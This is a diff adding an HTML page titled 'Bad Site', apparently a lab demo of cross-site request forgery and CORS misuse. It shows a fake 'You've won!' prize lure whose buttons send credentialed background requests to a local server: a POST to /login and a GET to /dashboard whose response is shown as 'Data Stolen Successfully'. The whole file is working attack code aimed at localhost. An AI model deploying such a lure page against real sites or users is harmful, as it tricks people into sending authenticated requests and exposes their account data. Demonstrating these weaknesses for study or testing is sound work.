@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bad Site</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .controls { margin-bottom: 20px; }
+        button { padding: 10px 15px; cursor: pointer; margin: 5px; }
+        #status { 
+            margin: 20px auto; 
+            padding: 15px; 
+            width: 80%; 
+            border: 1px solid #ccc; 
+            background: #f9f9f9; 
+            min-height: 50px; 
+            word-wrap: break-word;
+        }
+        .success { color: green; border-color: green; }
+        .error { color: red; border-color: red; }
+    </style>
+</head>
+<body>
+
+    <h1>Congratulations! You've won!</h1>
+    <p>Claim your prize or check your status below.</p>
+    
+    <div class="controls">
+        <button onclick="triggerLoginAttack()">1. Claim Prize (POST to /login)</button>
+        
+        <button onclick="getDashboardData()">2. View My Profile (GET from /dashboard)</button>
+    </div>
+
+    <div id="status">
+        Waiting for action...
+    </div>
+
+    <script>
+        const statusDiv = document.getElementById('status');
+        const BASE_URL = 'http://localhost:5000';
+
+        // Background POST request to prevent redirect
+        async function triggerLoginAttack() {
+            statusDiv.innerText = "Processing your prize...";
+            
+            try {
+                const response = await fetch(`${BASE_URL}/login`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    // credentials: 'include' is required to send existing cookies
+                    // or to allow the server to set NEW cookies on the browser
+                    credentials: 'include' 
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    statusDiv.innerText = "Login Attack Successful! Server said: " + data.message;
+                    statusDiv.className = 'success';
+                } else {
+                    statusDiv.innerText = "Attack Failed: " + (data.message || "Unknown error");
+                    statusDiv.className = 'error';
+                }
+            } catch (err) {
+                console.error(err);
+                statusDiv.innerText = "Network Error: Check if CORS is enabled on the server.";
+                statusDiv.className = 'error';
+            }
+        }
+
+        // Fetch-based Cross-Origin request to steal data
+        async function getDashboardData() {
+            statusDiv.innerText = "Attempting to fetch data...";
+            
+            try {
+                const response = await fetch(`${BASE_URL}/dashboard`, {
+                    method: 'GET',
+                    credentials: 'include' 
+                });
+
+                const data = await response.json();
+                
+                if (response.ok) {
+                    statusDiv.innerText = "Data Stolen Successfully: " + JSON.stringify(data);
+                    statusDiv.className = 'success';
+                } else {
+                    statusDiv.innerText = "Access Denied: " + data.message;
+                    statusDiv.className = 'error';
+                }
+            } catch (err) {
+                console.error(err);
+                statusDiv.innerText = "Error: Blocked by browser security (CORS/SameSite).";
+                statusDiv.className = 'error';
+            }
+        }
+    </script>
+</body>
+</html>
